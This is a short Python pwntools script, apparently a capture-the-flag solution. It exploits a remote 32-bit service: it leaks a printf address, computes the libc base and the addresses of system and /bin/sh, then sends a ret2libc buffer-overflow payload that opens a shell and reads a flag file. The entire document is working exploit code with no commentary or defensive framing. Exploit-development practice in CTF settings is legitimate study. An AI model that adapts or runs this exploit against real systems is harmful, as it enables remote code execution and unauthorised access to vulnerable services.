from pwn import *

# Set up remote connection
IP = "10.21.235.155"
PORT = 9999

# Offsets (from local libc.so.6)
PRINTF_OFFSET = 0x49030
SYSTEM_OFFSET = 0x3a950
BINSH_OFFSET = 0x15912b

conn = remote(IP, PORT)


#First payloadd to trigger printf leak
payload = b"A"*44  

# Connect to the remote server
conn.sendline(payload)

sleep(0.2)

#Receive and parse the printf address leak
response = conn.recvuntil(b"Which spell do you want to cast:", timeout=5)
print(response.decode())

sleep(0.2)
#Extract printf address using regex
match = re.search(r"Printf address:\s*(0x[0-9a-fA-F]+)", response.decode())
if match:
	leaked_printf_address = int(match.group(1), 16)
	log.info("Leaked printf address: {}".format(hex(leaked_printf_address)))
else:
	log.error("Failed to find printf address in response.")
	exit(1)

#Calculate addresses
libc_base = leaked_printf_address - PRINTF_OFFSET
system_address = libc_base + SYSTEM_OFFSET
binsh_address = libc_base + BINSH_OFFSET

log.info("Calculated libc base: {}".format(hex(libc_base)))
log.info("Calculated system address: {}".format(hex(system_address)))
log.info("Calculated /bin/sh address: {}".format(hex(binsh_address)))

sleep(0.2)

#Second payload
payload = b"A" * 52
payload += p32(system_address)
payload += b"AAAA"
payload += p32(binsh_address)


conn.sendline(payload)

sleep(0.2)

payload=b"ls"
conn.sendline(payload)


payload=b"cat flag"
conn.sendline(payload)


conn.interactive()
